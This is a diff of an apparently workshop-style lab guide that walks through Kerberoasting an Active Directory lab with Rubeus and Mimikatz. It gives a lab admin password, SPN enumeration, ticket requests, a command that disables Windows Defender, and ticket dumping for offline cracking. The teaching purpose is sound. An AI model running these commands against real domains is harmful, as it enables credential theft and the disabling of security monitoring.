@@ -1,10 +1,14 @@
 # Common Kerberoasting
 
 RYAN> Fill this all out and make it purty, boyfriend!!!
+RYAN> Fill this all out and make it purty, boyfriend!!!
+RYAN> Fill this all out and make it purty, boyfriend!!!
 
 What's a SPN?! Who cares? What's a MSA? AND WHY ARE THEY IMPORTANT?!!!
 
-BRANDON> Just commands for now, but this is what I'll be running :).
+Why is Kerberoasting effective? How to prevent?
+
+**BRANDON>** Just commands for now, but this is what I'll be running :).
 
 ## Kerberoasting via Rubeus
 
@@ -14,38 +18,42 @@ At this point you should still be RDP'd to TWORIVERS from the attack machine. On
 
 1. Use RunAs to run a PowerShell prompt as `WHEEL\Administrator`:
     
-    - Start menu -> type `run` -> click "Run (App)" -> Enter:
+    1. Start menu -> type `run` -> click "Run (App)" -> Enter:
+    
+    ```powershell
+    runas /user:wheel\Administrator powershell.exe
+    ```
+    
+    - You will be prompted to `Enter the password for wheel\Administrator:`, which is:
         
         ```
-        runas /user:wheel\Administrator powershell.exe
+        12qwaszx!@QWASZX
         ```
-    
-    - You will be prompted to `Enter the password for wheel\Administrator:`, at point you will enter the account's password:
-        - `12qwaszx!@QWASZX`
     
     A new PowerShell prompt with the title `Administrator: powershell.exe (running as wheel\Administrator` will open. Good!
 
     Now that we are running PowerShell as a domain admin, let's enumerate AD!
 
 1. Extract Rubeus:
-    ```
+
+    ```powershell
     cd C:\Users\Public\Desktop\LAB_FILES\assets\
     expand-archive ./Rubeus-1.6.4.zip
     cd .\Rubeus-1.6.4\Rubeus-1.6.4\
     ```
 
-    As a note, (Rubeus is provided as source code)[https://for528.com/rubeus]. Some TAs will use (a well-known pre-compiled version in their attacks)[https://for528.com/ghostpack-compiled], while others will compile the tool from source.
+    As a note, [Rubeus is provided as source code](https://for528.com/rubeus). Some TAs will use [a well-known pre-compiled version in their attacks](https://for528.com/ghostpack-compiled), while others will compile the tool from source.
 
 1. Perform a Kerberoasting attack using Rubeus:
     
-    ```
+    ```powershell
     ./rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\Perflogs\hashes.txt
     ```
 
-    Above we used the `/format:hashcat` option to tell Rubeus to output hashes in hashcat format. (The project's Roast.cs source file)[https://github.com/GhostPack/Rubeus/blob/659d98d8582573c2ff8c3a68ee0b02d7d5f8387d/Rubeus/lib/Roast.cs#L207] accepts either `john` or `hashcat` as the output options. Many TAs like to use (haschat)[https://for528.com/hashcat] because of its strong support for GPU cracking.
+    Above we used the `/format:hashcat` option to tell Rubeus to output hashes in hashcat format. [The project's Roast.cs source file](https://github.com/GhostPack/Rubeus/blob/659d98d8582573c2ff8c3a68ee0b02d7d5f8387d/Rubeus/lib/Roast.cs#L207) accepts either `john` or `hashcat` as the output options. Many TAs like to use [haschat](https://for528.com/hashcat) because of its strong support for GPU cracking.
 
-
-RYAN FILL ME OUT WITH THE NEXT STEPS FOR CRACKING SON!!!!
+!!!! RYAN FILL ME OUT WITH THE NEXT STEPS FOR CRACKING SON !!!!
+!!!! RYAN FILL ME OUT WITH THE NEXT STEPS FOR CRACKING SON !!!!
 
 ### DANGER WILL ROBINSON
 
@@ -62,7 +70,7 @@ See https://github.com/arosenmund/defcon_31_ad_good_bad_lolWut/issues/8
 
 Next we'll be usin Mimikatz to perform a Kerberoasting attack.
 
-To begin, you'll be using the same elevated PowerShell prompt via the `WHEEL\Administrator` account. If you closed the window, simply follow step #1 in the [Kerberoasting via Rubeus](#-kerberoasting-via-rubeus) section above, then follow the steps below.
+To begin, you'll be using the same elevated PowerShell prompt via the `WHEEL\Administrator` account. If you closed the window, simply follow step #1 in the [Kerberoasting via Rubeus](#kerberoasting-via-rubeus) section above, then follow the steps below.
 
 Though Rubeus automated the processing of Kerberoasting from start to finish, Mimikatz can be used with a bit more coaxing. Since lower-skilled TAs such as ransomware actors depend heavily on both of these tools, we'll now review an example method for Kerberoasting via Mimikatz.
 
@@ -76,13 +84,13 @@ We'll be using a bit of PowerShell to identify potentially susceptible SPNs and 
 
 1. Next, run the following to identify potentially susceptible accounts:
 
-    ```
-    get-aduser -filter * -properties ServicePrincipalName | Select SamAccountName, ServicePrincipalName | where {$_.ServicePrincipalName -ne $null} | fl
+    ```powershell
+    Get-ADUser -filter * -Properties ServicePrincipalName | Select SamAccountName, ServicePrincipalName | where {$_.ServicePrincipalName -ne $null} | fl
     ```
 
     Expected output:
     
-    ```
+    ```powershell
     SamAccountName       : krbtgt
     ServicePrincipalName : {kadmin/changepw}
 
@@ -94,15 +102,17 @@ We'll be using a bit of PowerShell to identify potentially susceptible SPNs and 
 
 1. Run the following to obtain a Kerberos ticket for the susceptible SPN:
 
-    ```
+    ```powershell
     Add-Type -AssemblyName System.IdentityModel
+    ```
     
+    ```powershell
     New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HOST/DRAGONMOUNT.wheel.co"
     ```
 
     Expected output:
     
-    ```
+    ```powershell
     Id                   : uuid-862b3890-a138-4061-96ac-8589821807b8-2
     SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
     ValidFrom            : 8/7/2023 6:41:19 PM
@@ -115,18 +125,20 @@ We'll be using a bit of PowerShell to identify potentially susceptible SPNs and 
     
     We will now **use Mimikatz to dump this ticket to disk.**
 
-    _NOTE:_ You should already have 1) disabled Windows Defender and 2) extracted Mimikatz. If not, make sure to disable WD extract Mimikatz now:
-    
-    ```
-    Set-MpPreference -DisableRealtimeMonitoring 1
-    
-    cd c:\Users\Public\Desktop\LAB_FILES\assets\
-    expand-archive ./mimikatz_trunk.zip
-    ```
+        _NOTE:_ You should already have 1) disabled Windows Defender and 2) extracted Mimikatz. If not, make sure to disable WD extract Mimikatz now:
+        
+        ```powershell
+        Set-MpPreference -DisableRealtimeMonitoring 1
+        ```
+        
+        ```powershell
+        cd c:\Users\Public\Desktop\LAB_FILES\assets\
+        expand-archive ./mimikatz_trunk.zip
+        ```
 
 1. Run mimikatz meow:
     
-    ```
+    ```powershell
     cd c:\Users\Public\Desktop\LAB_FILES\assets\mimikatz_trunk\x64\
     .\mimikatz.exe
     ```
@@ -174,9 +186,11 @@ We'll be using a bit of PowerShell to identify potentially susceptible SPNs and 
 
     The next step in this attack would be to:
         
-        1. Exfiltrate the `.kirbi` files
-        2. Attempt to crack the passwords contained within them
-            - This would normally occur out of the victim network. For example, the TA in this case might copy the `.kirbi` files out via RDP to the `Lighteater` host and then attempt to crack them there.
+    1. Exfiltrate the `.kirbi` files
+    
+    1. Attempt to crack the passwords contained within them
+        
+        - This would normally occur out of the victim network. For example, the TA in this case might copy the `.kirbi` files out via RDP to the `Lighteater` host and then attempt to crack them there.
 
 ### A note about kirbi files
 
@@ -196,13 +210,20 @@ This serves as a great example as to why being able to review source code can pr
 ## Cracking the Kirbi Files
 
 1. Exit Mimikatz:
-    - `mimikatz # exit`
+    
+    ```
+    mimikatz # exit
+    ```
 
 1. Review the dumped `.kirbi` files that you just obtained:
-    - `ls *.kirbi`
+    
+    ```powershell
+    ls *.kirbi
+    ```
     
     Expected output:
-    ```
+    
+    ```powershell
         Directory: C:\Users\Public\Desktop\LAB_FILES\assets\mimikatz_trunk\x64
 
     Mode                 LastWriteTime         Length Name
